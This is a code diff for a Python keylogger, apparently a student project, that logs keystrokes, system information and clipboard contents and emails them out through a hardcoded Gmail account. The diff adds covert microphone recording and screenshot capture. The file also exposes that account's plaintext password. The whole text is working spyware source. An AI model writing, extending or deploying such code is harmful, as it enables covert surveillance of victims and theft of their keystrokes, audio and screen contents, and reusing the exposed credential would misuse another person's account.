@@ -22,6 +22,9 @@ from PIL import ImageGrab
 keys_info = "key_log.txt"
 system_info = "systeminfo.txt"
 clipboard_info = "clipboard.txt"
+audio_info = "audio.wav"
+screenshot_info = "screenshot.png"
+microphone_time = 10
 email_address = "project5testmail123@gmail.com"
 password = "zrgu cujr tajp idvs "
 toaddr = "project5testmail123@gmail.com"
@@ -88,6 +91,19 @@ def copy_clipboard():
                f.write("Clipboard cannot be copied")
 copy_clipboard()      
 
+def microphone():
+     fs = 44100
+     seconds = microphone_time
+     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+     sd.wait()
+
+     write(file_path + extend + audio_info, fs, myrecording)
+microphone()
+
+def screenshot():
+     im = ImageGrab.grab()
+     im.save(file_path + extend + screenshot_info)
+screenshot()
 def on_press(key):
     global keys, count
     print(key)
